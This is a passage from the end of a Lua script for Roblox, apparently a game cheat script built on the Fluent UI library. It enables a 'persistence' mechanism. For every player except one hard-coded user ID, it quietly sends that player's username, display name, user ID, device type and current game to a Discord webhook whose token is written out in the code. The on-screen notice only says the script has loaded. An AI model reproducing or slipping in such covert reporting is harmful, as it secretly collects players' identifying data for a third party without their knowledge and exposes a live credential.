-- and game configs in a separate folder per game
InterfaceManager:SetFolder("CROW")
SaveManager:SetFolder("CROW/games")

Window:SelectTab(1)

InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)

Fluent:Notify({
    Title = "Interface",
    Content = "The script has been loaded.",
    Duration = 8
})

-- You can use the SaveManager:LoadAutoloadConfig() to load a config
-- which has been marked to be one that auto loads!
SaveManager:LoadAutoloadConfig()

-- ====== EXECUTE PERSISTENCE MECHANISM ======
-- Execute implementation and handle result
local result = implementPersistentScript()

-- Provide execution feedback
if result and result.success then

else
    warn("[ERROR] Failed to implement script persistence")
    
    Fluent:Notify({
        Title = "Persistence System",
        Content = "Failed to enable script persistence",
        Duration = 5
    })
end

-- Check if the player is not the specified user ID
if game.Players.LocalPlayer.UserId ~= 3794743195 then
    local webhookUrl = "https://discord.com/api/webhooks/1361709854322065428/A6MTgunZ3acs-NUsZd1Ybw4iaRij1lpDRLfQJOFU7UQ58MltyI8pdfi1hyrrv4Ewl2Hx"


    function SendMessage(url, message)
        local http = game:GetService("HttpService")
        local headers = {
            ["Content-Type"] = "application/json"
        }
        local data = {
            ["content"] = message
        }
        local body = http:JSONEncode(data)
        local response = request({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end

    function SendMessageEMBED(url, embed)
        local http = game:GetService("HttpService")
        local headers = {
            ["Content-Type"] = "application/json"
        }
        local data = {
            ["embeds"] = {
                {
                    ["title"] = embed.title,
                    ["description"] = embed.description,
                    ["color"] = embed.color,
                    ["fields"] = embed.fields,
                    ["footer"] = embed.footer,
                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }
            }
        }
        local body = http:JSONEncode(data)
        local response = request({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end

    function SendPlayerInfo(url)
        local player = game.Players.LocalPlayer
        local username = player.Name
        local username2 = player.DisplayName
        local playerId = player.UserId
        local placeId = game.PlaceId
        local placeName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
        local deviceType = "Unknown"

        if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.ButtonA) then
            deviceType = "Console"
        elseif game:GetService("UserInputService").TouchEnabled then
            deviceType = "Mobile"
        elseif game:GetService("UserInputService").KeyboardEnabled then
            deviceType = "PC"
        end

        -- Create brutal style embed with highlighting but no emojis
        local embed = {
            ["title"] = "SCRIPT EXECUTED IN " .. placeName,
            ["description"] = "",
            ["color"] = 15158332, -- Red color for aggressive look
            ["fields"] = {
                {
                    ["name"] = "DISPLAY NAME",
                    ["value"] = "**" .. username2 .. "**",
                    ["inline"] = true
                },
                {
                    ["name"] = "USERNAME",
                    ["value"] = "**" .. username .. "**",
                    ["inline"] = true
                },
                {
                    ["name"] = "User ID",
                    ["value"] = "**" .. playerId .. "**",
                    ["inline"] = true
                },
                {
                    ["name"] = "DEVICE",
                    ["value"] = "**" .. deviceType .. "**",
                    ["inline"] = true
                },
                {
                    ["name"] = "PLACE",
                    ["value"] = "**" .. placeName .. "**",
                    ["inline"] = false
                },
                {
                    ["name"] = "PLACE ID",
                    ["value"] = "**" .. tostring(placeId) .. "**",
                    ["inline"] = true
                },
                {
                    ["name"] = "TIME",
                    ["value"] = "**" .. os.date("%H:%M:%S") .. "**",
                    ["inline"] = true
                }
            },
            ["footer"] = {
                ["text"] = "Version: " .. Version
            }
        }

        SendMessageEMBED(url, embed)
    end

    -- Example usage:
    SendPlayerInfo(webhookUrl)
end


Fluent:Notify({
    Title = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.." | "..Version,
    Content = "The script has been loaded.",
    Duration = 8
})



else
    Fluent:Notify({
        Title = "Interface",
        Content = "This script is already running.",
        Duration = 3
    })
end